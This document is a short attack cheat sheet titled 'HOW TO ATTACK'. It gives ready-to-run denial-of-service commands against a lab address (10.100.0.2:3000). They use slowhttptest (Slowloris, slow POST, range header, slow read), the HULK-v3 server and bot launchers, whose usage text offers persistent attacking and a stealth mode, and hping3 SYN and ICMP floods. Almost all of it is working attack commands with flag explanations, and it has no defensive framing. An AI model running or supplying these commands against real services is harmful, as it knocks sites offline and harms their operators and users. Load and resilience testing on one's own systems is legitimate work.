# HOW TO ATTACK

## Slowhttptest
```
slowhttptest -H -g -c 5260 -i 10 -r 30 -t GET -u http://10.100.0.2:3000/ -x 24 -p 3
```

    -H: Enable slow headers attack
    -g: Generate headers randomly
    -c 5260: Number of connections to create
    -i 10: Interval between follow-up data in seconds
    -r 30: Number of requests per connection
    -t GET: HTTP method to use (GET in this case)
    -u http://10.100.0.2:3000/: Target URL to attack
    -x 24: Number of simultaneous connections
    -p 3: Number of child processes to fork
SLOWLORIS
```
slowhttptest -c 1000 -H -g -i 10 -r 200 -t GET -u http://10.100.0.2:3000/ -x 24 -p 3


```
SLOW HTTP POST
```
slowhttptest -c 3000 -B -g -i 110 -r 200 -s 8192 -t POST -u http://10.100.0.2:3000/ -x 10 -p 3

```
RANGE HEADER
```
slowhttptest -R -u http://10.100.0.2:3000/ -t HEAD -c 1000 -a 10 -b 3000 -r 500
```
SLOW READ
```
slowhttptest -c 8000 -X -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://10.100.0.2:3000/ -p 3
```
## hulk
```
python3 HULK-v3/hulk_launcher.py server http://10.100.0.2:3000
```
```
python3 HULK-v3/hulk_launcher.py client -n 10
```
### Server :computer:
```
usage: hulk_launcher.py server [-h] [-p PORT] [-m MAX_MISSILES] [--persistent] [--gui] target

The Hulk Server Launcher

positional arguments:
target                the target url.

options:
-h, --help            show this help message
-p PORT, --port PORT  the Port to bind the server to.
-m MAX_MISSILES, --max_missiles MAX_MISSILES the maximum number of missiles to connect to.
--persistent          keep attacking even after target goes down.
--gui                 run on the GUI mode.
```

### Client :space_invader:
```
usage: hulk_launcher.py client [-h] [-r ROOT_IP] [-p ROOT_PORT] [-n NUM_PROCESSES] [-s]

The Hulk Bot Launcher

options:
-h, --help            show this help message
-r ROOT_IP, --root_ip ROOT_IP                        IPv4 Address where Hulk Server is running.
-p ROOT_PORT, --root_port ROOT_PORT                  Port where Hulk Server is running.
-n NUM_PROCESSES, --num_processes NUM_PROCESSES      Number of Processes to launch.
-s, --stealth         Stealth mode.
```
###hping3
```
hping3 -S -p 3000 --flood 10.100.0.2
hping3 -p 3000 --icmp --flood 10.100.0.2 


